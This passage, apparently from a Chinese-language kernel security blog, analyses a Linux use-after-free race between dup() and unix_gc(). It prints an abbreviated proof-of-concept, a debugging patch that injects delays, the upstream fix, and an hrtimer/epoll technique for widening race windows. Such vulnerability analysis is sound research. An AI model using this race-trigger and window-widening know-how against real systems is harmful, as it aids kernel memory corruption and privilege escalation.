<li>遍历 <code>gc_candidates</code><ul>
<li>把满足条件的 <code>skb</code> 添加到 <code>hitlist</code></li>
</ul>
</li>
<li>释放 <code>hitlist</code> 上的 <code>skb</code> 内存和与之绑定的 <code>struc file</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unix_gc()</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> <span class="title">hitlist</span>;</span></span><br><span class="line">	...</span><br><span class="line">	list_for_each_entry_safe(u, next, &amp;gc_inflight_list, link) &#123;</span><br><span class="line">		total_refs = file_count(u-&gt;sk.sk_socket-&gt;file);</span><br><span class="line">		inflight_refs = atomic_long_read(&amp;u-&gt;inflight);</span><br><span class="line">		<span class="keyword">if</span> (total_refs == inflight_refs) &#123;</span><br><span class="line">			list_move_tail(&amp;u-&gt;link, &amp;gc_candidates);</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	skb_queue_head_init(&amp;hitlist);</span><br><span class="line">	list_for_each_entry(u, &amp;gc_candidates, link)</span><br><span class="line">		scan_children(&amp;u-&gt;sk, inc_inflight, &amp;hitlist);</span><br><span class="line">			scan_inflight(&amp;u-&gt;sk, func, hitlist);</span><br><span class="line">				__skb_queue_tail(hitlist, skb);</span><br><span class="line">	...</span><br><span class="line">	__skb_queue_purge(&amp;hitlist);</span><br><span class="line">		kfree_skb(skb);</span><br></pre></td></tr></table></figure>

<p><strong>unix_gc() 中 file 和 skb 在哪里 free ?</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">unix_gc()</span><br><span class="line">	...</span><br><span class="line">	skb_queue_head_init(&amp;hitlist);</span><br><span class="line">	list_for_each_entry(u, &amp;gc_candidates, link) <span class="comment">// 从gc_candidates取skb到hitlist</span></span><br><span class="line">		scan_children(&amp;u-&gt;sk, inc_inflight, <span class="literal">NULL</span>);</span><br><span class="line">			scan_inflight(&amp;u-&gt;sk, func, hitlist);</span><br><span class="line">				__skb_queue_tail(hitlist, skb);</span><br><span class="line">	...</span><br><span class="line">	__skb_queue_purge(&amp;hitlist); <span class="comment">// (4)</span></span><br><span class="line">		kfree_skb(skb);</span><br><span class="line">		...</span><br><span class="line">			**skb-&gt;destructor() <span class="comment">// 在 sendmsg 设置</span></span><br><span class="line">				unix_destruct_scm()**</span><br><span class="line">					scm_destroy()</span><br><span class="line">						__scm_destroy()</span><br><span class="line">							**fput() <span class="comment">// 如果 f_count 是 1 则减到 0 然后释放 file**</span></span><br><span class="line">			kfree_skbmem()</span><br><span class="line">				**kmem_cache_free(.., skb) <span class="comment">// 释放 skb**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// unix_destruct_scm 在 sendmsg 设置</span></span><br><span class="line">sendmsg()</span><br><span class="line">  __sys_sendmsg()</span><br><span class="line">    sock_sendmsg()</span><br><span class="line">      sock_sendmsg_nosec()</span><br><span class="line">        unix_stream_sendmsg() <span class="comment">// struct unix_stream_ops </span></span><br><span class="line">          skb = sock_alloc_send_pskb()</span><br><span class="line">          unix_scm_to_skb()</span><br><span class="line">							**skb-&gt;destructor = unix_destruct_scm;**</span><br></pre></td></tr></table></figure>

<h3 id="unix-gc-何时被调用？"><a href="#unix-gc-何时被调用？" class="headerlink" title="unix_gc() 何时被调用？"></a><code>unix_gc()</code> 何时被调用？</h3><ul>
<li><code>close()</code> 可以间接触发<ul>
<li>具体入口的 <code>syscall_exit_to_user_mode() - __fput()</code></li>
</ul>
</li>
<li><code>sendmsg()</code> 也可以触发但只在队列满的时候<ul>
<li><code>sendmsg（) - wait_for_unix_gc()</code></li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// close() 一个 f_count 为 1 的文件时触发</span></span><br><span class="line"><span class="built_in">close</span>()</span><br><span class="line">    close_fd()</span><br><span class="line">        filp_close()</span><br><span class="line">            fput()</span><br><span class="line">	            fput_many(file, <span class="number">1</span>);</span><br><span class="line">                    atomic_long_sub_and_test(refs, &amp;file-&gt;f_count) </span><br><span class="line">	                    init_task_work(&amp;file-&gt;f_u.fu_rcuhead, ____fput)</span><br><span class="line">	                    task_work_add(task, &amp;file-&gt;f_u.fu_rcuhead, TWA_RESUME)</span><br><span class="line">entry_SYSCALL_64 </span><br><span class="line">	do_syscall_64</span><br><span class="line">		syscall_exit_to_user_mode</span><br><span class="line">			...</span><br><span class="line">				tracehook_notify_resume</span><br><span class="line">					task_work_run()</span><br><span class="line">						__fput() </span><br><span class="line">							sock_close()  <span class="comment">// (struct file *) -&gt;f_op-&gt;release()</span></span><br><span class="line">								__sock_release() </span><br><span class="line">									unix_release()  <span class="comment">// (struct socket *) -&gt;ops-&gt;release()</span></span><br><span class="line">										unix_release_sock() </span><br><span class="line">											**unix_gc()**</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只有 inflight sockets 超过 UNIX_INFLIGHT_TRIGGER_GC（16000) 才会调用</span></span><br><span class="line">sendmsg()</span><br><span class="line">	...</span><br><span class="line">		unix_stream_sendmsg()/unix_dgram_sendmsg()</span><br><span class="line">			wait_for_unix_gc()</span><br><span class="line">				<span class="keyword">if</span> (unix_tot_inflight &gt; UNIX_INFLIGHT_TRIGGER_GC &amp;&amp; !gc_in_progress)</span><br><span class="line">					**unix_gc();**</span><br></pre></td></tr></table></figure>

<h3 id="dup-的作用和实现原理？"><a href="#dup-的作用和实现原理？" class="headerlink" title="dup() 的作用和实现原理？"></a>dup() 的作用和实现原理？</h3><ul>
<li>根据 fd 从 fd table 中获取 <code>struct file *file</code></li>
<li>如果 <code>f_count</code> 不为 0 则 <code>file-&gt;f_count += 1</code></li>
<li>fd table 中新建一个条目指向 file</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE1(dup, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fildes)</span><br><span class="line">    fget_raw()</span><br><span class="line">        __fget(fd, FMODE_PATH, <span class="number">1</span>)</span><br><span class="line">            __fget_files(current-&gt;files, fd, mask, refs)</span><br><span class="line">									file = files_lookup_fd_rcu(files, fd);<span class="comment">// 根据 fd 从 fd table 中获取 struct file *file</span></span><br><span class="line">                get_file_rcu_many(file, refs) </span><br><span class="line">										atomic_long_add_unless(&amp;(x)-&gt;f_count, (cnt), <span class="number">0</span>) <span class="comment">// if not 0, file-&gt;f_count += 1</span></span><br><span class="line">		get_unused_fd_flags()</span><br><span class="line">		fd_install() <span class="comment">// fd table 中新建一个条目指向 file</span></span><br></pre></td></tr></table></figure>

<h3 id="close-的作用和实现原理？"><a href="#close-的作用和实现原理？" class="headerlink" title="close() 的作用和实现原理？"></a><code>close()</code> 的作用和实现原理？</h3><ul>
<li>使 fd 重新可用</li>
<li>把 fd table 中 fd 对应的条目删除(设置为 NULL)</li>
<li>fd table 中原来指向的 <code>struct file</code> 的 <code>f_count</code> 减 1，如果减到 0 则释放 struct file 的内存</li>
<li><code>close</code> 不一定会立马释放 <code>struct file</code>,  但是用户态不能再访问该 <code>fd</code>，比如<code>dup(fd)</code>,<code>read(fd)</code> ..</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>()</span><br><span class="line">    close_fd()</span><br><span class="line">        pick_file()</span><br><span class="line">	        fdt = files_fdtable(files);</span><br><span class="line">	        file = fdt-&gt;fd[fd];</span><br><span class="line">	        **rcu_assign_pointer(fdt-&gt;fd[fd], <span class="literal">NULL</span>); <span class="comment">// fd table 中 fd 对应的条目删除</span></span><br><span class="line">	        __put_unused_fd(files, fd); <span class="comment">// 使 fd 重新可用**</span></span><br><span class="line">        filp_close()</span><br><span class="line">            **fput()**</span><br><span class="line">	            fput_many(file, <span class="number">1</span>); <span class="comment">// fd table 中原来指向的 struct file 的 f_count 减 1</span></span><br><span class="line">                    atomic_long_sub_and_test(refs, &amp;file-&gt;f_count)</span><br><span class="line">                    **init_task_work(&amp;file-&gt;f_u.fu_rcuhead, ____fput)**</span><br><span class="line">                    task_work_add(task, &amp;file-&gt;f_u.fu_rcuhead, TWA_RESUME)</span><br><span class="line"></span><br><span class="line">____fput()</span><br><span class="line">	__fput()</span><br><span class="line">		file_free()</span><br><span class="line">			file_free_rcu()</span><br><span class="line">				**kmem_cache_free(filp_cachep, f) <span class="comment">// 如果减到 0 则释放 struct file 的内存**</span></span><br></pre></td></tr></table></figure>

<h3 id="增加-kernel-delay-patch-的-poc-如何-work"><a href="#增加-kernel-delay-patch-的-poc-如何-work" class="headerlink" title="增加 kernel delay patch 的 poc 如何 work ?"></a>增加 kernel delay patch 的 poc 如何 work ?</h3><ul>
<li>line-27 将 pair[0] f_count +1 并添加到 <code>gc_inflight_list</code> 和 <code>sk_receive_queue</code></li>
<li>line-29 和 line-43 用于触发 <code>unix_gc()</code> 调用, 因为需要一个 <code>f_count</code> 为 1 的 <code>fd</code> 被 <code>close()</code></li>
<li>line-36 用于等待 <code>resurrect_fn()-&gt;dup()-&gt;__fget_files()</code> 调用进入 race window 拿到 <code>struct file</code> , 因为 line-37 会把 <code>pair[0]</code> 从 fd table 中移除。 usleep 的时间 100000 us 要小于 kernel patch 的 500ms</li>
<li>line-43 会在 <code>__fget_files()</code> 等待的期间执行 <code>unix_gc()</code> , 在执行到准备释放 skb 的代码时，会等待 line-11 的 dup() 完成。</li>
<li><code>dup()</code> 完成后执行到 line-16 的 <code>recvmsg()</code> ，内核会等待 line-43 触发的 <code>unix_gc()</code> 完成 skb 的释放</li>
<li><code>unix_gc()</code> 完成后，<code>recvmsg()</code> 继续执行拿到被释放的 skb，UAF</li>
</ul>
<p>省略版 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247" target="_blank" rel="noopener">POC</a>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">void</span> <span class="title">send_fd</span><span class="params">(<span class="keyword">int</span> sock, <span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span> ...</span><br><span class="line"><span class="number">3</span>     sendmsg(sock, &amp;msg, <span class="number">0</span>);</span><br><span class="line"><span class="number">4</span> &#125;</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">int</span> resurrect_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="number">7</span> <span class="keyword">int</span> resurrected_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span> <span class="function"><span class="keyword">void</span> *<span class="title">resurrect_fn</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"><span class="number">10</span>   prctl(PR_SET_NAME, <span class="string">"SLOW-ME"</span>); <span class="comment">// tell kernel to inject mdelay()</span></span><br><span class="line"><span class="number">11</span>   resurrected_fd = dup(resurrect_fd);</span><br><span class="line"><span class="number">12</span>   prctl(PR_SET_NAME, <span class="string">"resurrect"</span>);</span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span>   prctl(PR_SET_NAME, <span class="string">"SLOW-RECV"</span>);</span><br><span class="line"><span class="number">15</span> ...</span><br><span class="line"><span class="number">16</span>   <span class="keyword">int</span> recv_bytes = recvmsg(resurrected_fd, &amp;msg, MSG_DONTWAIT);</span><br><span class="line"><span class="number">17</span>   prctl(PR_SET_NAME, <span class="string">"resurrect"</span>);</span><br><span class="line"><span class="number">18</span></span><br><span class="line"><span class="number">19</span>   <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">20</span> &#125;</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="number">23</span>   <span class="comment">/* create socketpair  */</span></span><br><span class="line"><span class="number">24</span>   <span class="keyword">int</span> pair[<span class="number">2</span>];</span><br><span class="line"><span class="number">25</span>   socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, pair);</span><br><span class="line"><span class="number">26</span></span><br><span class="line"><span class="number">27</span>   send_fd(pair[<span class="number">1</span>], pair[<span class="number">0</span>]);</span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">29</span>   <span class="keyword">int</span> trigger_sock = socket(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">31</span>   resurrect_fd = pair[<span class="number">0</span>];</span><br><span class="line"><span class="number">32</span></span><br><span class="line"><span class="number">33</span>   <span class="keyword">pthread_t</span> resurrect_thread;</span><br><span class="line"><span class="number">34</span>   pthread_create(&amp;resurrect_thread, <span class="literal">NULL</span>, resurrect_fn, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">35</span></span><br><span class="line"><span class="number">36</span>   usleep(<span class="number">100000</span>); <span class="comment">/* wait for fget_raw() to see pointer */</span></span><br><span class="line"><span class="number">37</span>   <span class="built_in">close</span>(pair[<span class="number">0</span>]);</span><br><span class="line"><span class="number">38</span></span><br><span class="line"><span class="number">39</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">40    * trigger unix GC; has to read file_count() before file inc</span></span><br><span class="line"><span class="comment">41    * but do hitlist kill after file inc</span></span><br><span class="line"><span class="comment">42    */</span></span><br><span class="line"><span class="number">43</span>   <span class="built_in">close</span>(trigger_sock);</span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="number">45</span>   <span class="comment">/* make sure dup() has really finished */</span></span><br><span class="line"><span class="number">46</span>   pthread_join(resurrect_thread, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">47</span></span><br><span class="line"><span class="number">48</span> &#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=531225" target="_blank" rel="noopener">kernel patch</a> 增加三个 mdelay </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-850</span>,<span class="number">6</span> +<span class="number">852</span>,<span class="number">13</span> @@ <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">fget_files</span>(<span class="title">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">fd</span>,</span></span><br><span class="line"><span class="class"> <span class="title">loop</span>:</span></span><br><span class="line">        file = files_lookup_fd_rcu(files, fd);</span><br><span class="line">        <span class="keyword">if</span> (file) &#123;</span><br><span class="line">+               <span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, <span class="string">"SLOW-ME"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">+                       pr_warn(<span class="string">"slowing lookup of fd %u to file 0x%lx with %ld refs\n"</span>,</span><br><span class="line">+                               fd, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)file, file_count(file));</span><br><span class="line">**+                       mdelay(<span class="number">500</span>);**</span><br><span class="line">+                       pr_warn(<span class="string">"slowed lookup of fd %u to file 0x%lx with %ld refs\n"</span>,</span><br><span class="line">+                               fd, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)file, file_count(file));</span><br><span class="line">+               &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">@@ <span class="number">-2631</span>,<span class="number">6</span> +<span class="number">2633</span>,<span class="number">12</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="function"><span class="params">                last = skb = skb_peek(&amp;sk-&gt;sk_receive_queue);</span></span></span><br><span class="line"><span class="function"><span class="params">                last_len = last ? last-&gt;len : <span class="number">0</span>;</span></span></span><br><span class="line"><span class="function"><span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">+               <span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, <span class="string">"SLOW-RECV"</span>) == <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+                       pr_warn(<span class="string">"recvmsg: delaying stream receive\n"</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+                       mdelay(<span class="number">500</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+                       pr_warn(<span class="string">"recvmsg: delayed stream receive\n"</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+               &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">+</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">@@ <span class="number">-210</span>,<span class="number">8</span> +<span class="number">212</span>,<span class="number">11</span> @@ <span class="keyword">void</span> unix_gc(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">        skb_queue_head_init(&amp;hitlist);</span></span></span><br><span class="line"><span class="function"><span class="params">+       <span class="keyword">if</span> (<span class="built_in">strcmp</span>(current-&gt;comm, <span class="string">"resurrect"</span>) == <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">+               pr_warn(<span class="string">"unix: delaying hitlist setup\n"</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+               mdelay(<span class="number">500</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+               pr_warn(<span class="string">"unix: hitlist setup delay done\n"</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">+       &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">        list_for_each_entry(u, &amp;gc_candidates, link)</span></span></span><br><span class="line"><span class="function"><span class="params">                scan_children(&amp;u-&gt;sk, inc_inflight, &amp;hitlist);</span></span></span><br></pre></td></tr></table></figure>

<h3 id="fixed-patch-如何-work"><a href="#fixed-patch-如何-work" class="headerlink" title="fixed patch 如何 work ?"></a>fixed <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=054aa8d439b9185d4f5eb9a90282d1ce74772969" target="_blank" rel="noopener">patch</a> 如何 work ?</h3><ul>
<li>补丁效果：在 race window 期间,如果 fd 对应的 <code>struct file</code> 已经从 fd table 移除，则回退对 <code>f_count</code> 的操作，如果发现回退后变为 0 则直接释放 <code>struct file</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/file.c b/fs/file.c</span><br><span class="line">index <span class="number">8627</span>dacfc4246..ad4a8bf3cf109 <span class="number">100644</span></span><br><span class="line">--- a/fs/file.c</span><br><span class="line">+++ b/fs/file.c</span><br><span class="line">@@ <span class="number">-858</span>,<span class="number">6</span> +<span class="number">858</span>,<span class="number">10</span> @@ loop:</span><br><span class="line"> 			file = <span class="literal">NULL</span>;</span><br><span class="line"> 		<span class="keyword">else</span> <span class="keyword">if</span> (!get_file_rcu_many(file, refs))</span><br><span class="line"> 			<span class="keyword">goto</span> loop;</span><br><span class="line">+		<span class="keyword">else</span> <span class="keyword">if</span> (files_lookup_fd_raw(files, fd) != file) &#123;</span><br><span class="line">+			fput_many(file, refs);</span><br><span class="line">+			<span class="keyword">goto</span> loop;</span><br><span class="line">+		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	rcu_read_unlock();</span><br></pre></td></tr></table></figure>

<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part.3"></a>Part.3</h2><h3 id="如何利用-hrtimer-扩大-race-成功率？"><a href="#如何利用-hrtimer-扩大-race-成功率？" class="headerlink" title="如何利用 hrtimer 扩大 race 成功率？"></a>如何利用 hrtimer 扩大 race 成功率？</h3><ul>
<li><code>timerfd_create</code> + <code>timerfd_settime</code> 可以在指定时间(纳秒)后触发 timer interrupt</li>
<li>timer interrupt handler 会调用 <code>__wake_up_common</code> 遍历 wait queue 并执行回调函数。这意味着 wait queue 越长，处在 interrupt context 的时间越长</li>
<li>利用这一点可以让进程在 race window 中被中断，然后在另一个 CPU 上运行需要与之 race 的进程</li>
</ul>
<p><strong>wait queue item 在哪里添加和读取 ?</strong></p>
<ul>
<li>每一个 <code>EPOLL_CTL_ADD</code> 会在 timer_fd 的 wait queue 上添加一个执行 <code>ep_poll_callback</code> 的 entry</li>
<li>在 <code>timerfd_triggered</code> 中 从 timer_fd 的 wait queue 中取出 entry</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, timer_fds[j]</span></span><br><span class="line"></span><br><span class="line">do_epoll_ctl() <span class="comment">// 在 ep_ptable_queue_proc 中添加 wait_queue_enty</span></span><br><span class="line">	ep_insert(struct eventpoll *ep, ..</span><br><span class="line">		struct ep_pqueue epq;</span><br><span class="line">		init_poll_funcptr(&amp;epq.pt, **ep_ptable_queue_proc**); <span class="comment">// epq.pt._qproc = **ep_ptable_queue_proc**</span></span><br><span class="line">		ep_item_poll(epi, &amp;epq.pt, <span class="number">1</span>);</span><br><span class="line">			vfs_poll</span><br><span class="line">				timerfd_poll <span class="comment">// struct file_operations timerfd_fops.poll</span></span><br><span class="line">					struct timerfd_ctx *ctx = file-&gt;private_data;</span><br><span class="line">					poll_wait(file, &amp;ctx-&gt;wqh, wait); <span class="comment">// &amp;ctx-&gt;wqh: whead, wait: &amp;epq.pt, (include/linux/poll.h)</span></span><br><span class="line">						**ep_ptable_queue_proc**(struct file *file, <span class="keyword">wait_queue_head_t</span> *whead, poll_table *pt)</span><br><span class="line">							struct epitem *epi = ep_item_from_epqueue(pt);</span><br><span class="line">							struct eppoll_entry *pwq;</span><br><span class="line">							...</span><br><span class="line">							pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL);</span><br><span class="line">						  ...</span><br><span class="line">							**init_waitqueue_func_entry(&amp;pwq-&gt;wait, ep_poll_callback);**</span><br><span class="line">							...</span><br><span class="line">							**add_wait_queue(whead, &amp;pwq-&gt;wait); <span class="comment">// whead:** &amp;ctx-&gt;wqh</span></span><br><span class="line">							...</span><br><span class="line"></span><br><span class="line">struct ep_pqueue &#123;</span><br><span class="line">    poll_table pt;</span><br><span class="line">    struct epitem *epi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct poll_table_struct &#123;</span><br><span class="line">    poll_queue_proc _qproc; <span class="comment">// void (*)(struct file *, wait_queue_head_t *, struct poll_table_struct *)</span></span><br><span class="line">    <span class="keyword">__poll_t</span> _key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">local_apic_timer_interrupt()</span><br><span class="line">	**hrtimer_interrupt()**</span><br><span class="line">		...</span><br><span class="line">		timerfd_tmrproc()</span><br><span class="line">			**timerfd_triggered()** </span><br><span class="line">				**spin_lock_irqsave(&amp;ctx-&gt;wqh.lock, flags);** <span class="comment">// 关中断</span></span><br><span class="line">****				ctx-&gt;expired = <span class="number">1</span>;</span><br><span class="line">				ctx-&gt;ticks++;</span><br><span class="line">				wake_up_locked_poll(**&amp;ctx-&gt;wqh**, EPOLLIN);</span><br><span class="line">					**__wake_up_common() <span class="comment">// 遍历 wait queue, 执行 callback**</span></span><br><span class="line">						<span class="keyword">wait_queue_entry_t</span> *curr, *next;</span><br><span class="line">						**list_for_each_entry_safe_from(curr, next, &amp;wq_head-&gt;head, entry)** </span><br><span class="line">							ret = curr-&gt;func(curr, mode, wake_flags, key); <span class="comment">// ep_poll_callback</span></span><br><span class="line">				spin_unlock_irqrestore(&amp;ctx-&gt;wqh.lock, flags);</span><br></pre></td></tr></table></figure>

<p><code>**timerfd_tmrproc</code> 在 <code>timerfd_setup</code> 中设置**</p>
